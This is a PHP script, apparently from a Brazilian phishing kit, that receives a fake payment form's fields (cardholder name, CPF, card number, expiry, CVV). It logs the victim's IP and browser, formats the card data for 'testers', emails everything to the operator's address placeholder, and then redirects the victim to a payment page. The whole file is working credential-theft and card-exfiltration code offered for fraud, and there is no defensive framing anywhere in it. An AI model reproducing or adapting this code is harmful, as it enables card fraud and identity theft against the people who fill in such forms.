<?php

/*
<!-- 
#########################################
|       CRIADO POR: win32ownz           |
|         SKYPE: win32ownz              |
#########################################
-->

*/
$useragent = $_SERVER['HTTP_USER_AGENT'];
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }
//PEGA OS DADOS ENVIADOS PELO FORMULÁRIO 01
$titular_cc = $_POST["titular_cc"];
$cpf = $_POST["cpf"];
$numero_cc = $_POST["numero_cc"];
$mes_cc = $_POST["mes_cc"];
$ano_cc = $_POST["ano_cc"];
$cvv_cc = $_POST["cvv_cc"];
$dados = $numero_cc.";".$mes_cc.";".$ano_cc. ";" .$cvv_cc;
//----------------------------------------
$ip = $_SERVER["REMOTE_ADDR"];
$hora=date("H:i:s");
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: INFO CC RECARGA <naodeletar@hotmail.com>";
$conteudo.="$q2";
$conteudo.="<b>IP: </b>$ip - Navegador: </b>$browser $browser_version<br>";
//------------------------------------------------------------------------

// Dados do cartao de credito
$conteudo.="<b>Nome Impresso: </b>$titular_cc<br>";
$conteudo.="<b>cpf: </b>$cpf<br>";
$conteudo.="<b>Numero Cartao: </b>$numero_cc<br>";
$conteudo.="<b>Mes Nacimento: </b>$mes_cc<br>";
$conteudo.="<b>Ano Nascimento: </b>$ano_cc<br>";
$conteudo.="<b>Code Seguranca:</b> $cvv_cc<br>";
$conteudo.="<br>";
$conteudo.="<b>Usar para testadores:</b><br>";
$conteudo.= $dados;




if(!empty($$aux_testa_se_envia)){
mail(constant("EMAIL"),constant("ASSUNTO"),$conteudo,$headers);
}
if(!empty($aux_testa_se_envia)){
mail($$aux_testa_se_envia,constant("ASSUNTO"),$conteudo,$headers);
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@mail("SEU EMAIL AKI", "$bandeira - $ip", "$conteudo", $headers); //Meter email aqui para receber as info      
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
echo"<meta http-equiv='refresh' content='2;url=pagamento.php'>";
?>
